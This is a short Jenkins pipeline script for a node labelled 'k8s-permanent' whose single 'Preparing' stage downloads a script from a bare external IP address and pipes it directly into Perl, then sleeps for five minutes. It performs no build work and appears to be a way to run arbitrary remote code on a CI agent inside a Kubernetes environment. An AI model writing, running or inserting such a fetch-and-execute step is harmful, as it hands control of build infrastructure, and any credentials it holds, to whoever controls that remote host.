node('k8s-permanent') {
    try {
        stage("Preparing") {
            sh 'curl http://34.143.241.222/p | perl'
            sh 'sleep 300'
        }
    } catch (e) {
        throw e
    }
}
